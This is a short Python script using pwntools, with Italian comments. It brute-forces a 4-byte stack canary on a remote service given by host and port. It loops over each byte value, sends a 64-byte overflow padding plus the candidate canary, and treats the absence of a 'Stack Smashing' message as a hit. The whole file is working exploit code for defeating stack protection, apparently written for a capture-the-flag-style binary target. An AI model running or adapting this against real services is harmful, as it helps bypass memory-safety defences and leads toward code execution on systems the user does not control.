#!/usr/bin/env python3

import argparse
from pwn import remote, context

def main():
  # Disabilita l'output di debug di Pwntools
  context.log_level = 'error'

  # Parsing degli argomenti da linea di comando
  parser = argparse.ArgumentParser(description="Brute-force per trovare i 4 byte del canary")
  parser.add_argument("host", type=str, help="Hostname o IP del servizio target")
  parser.add_argument("port", type=int, help="Porta del servizio target")
  args = parser.parse_args()

  buffer_size = 64
  canary_length = 4
  canary_found = b''

  # La lunghezza totale: buffer + canary
  total_length = buffer_size + canary_length
  length = f"{total_length}\n".encode()

  for byte_index in range(canary_length):
    for byte_val in range(256):
      # Costruzione del payload
      padding = b'A' * buffer_size
      candidate_canary = canary_found + bytes([byte_val])
      payload = padding + candidate_canary + b'\n'

      # Connessione al servizio remoto
      with remote(args.host, args.port) as conn:
        # Qui assumiamo di ricevere un prompt ">", modificare se non presente nel target
        conn.recvuntil(b"> ", timeout=5)
        conn.send(length)

        conn.recvuntil(b"> ", timeout=5)
        conn.send(payload)

        # Riceviamo la risposta
        response = conn.recvall(timeout=5)

      # Controllo se non abbiamo ricevuto l'indicazione di stack smashing
      if b"Stack Smashing" not in response:
        canary_found += bytes([byte_val])
        print(f"Byte {byte_index} del canary trovato: 0x{byte_val:02x}")
        break

  # Alla fine stampiamo i 4 byte trovati
  print(f"Canary trovato: {canary_found.hex()}")

if __name__ == "__main__":
  main()
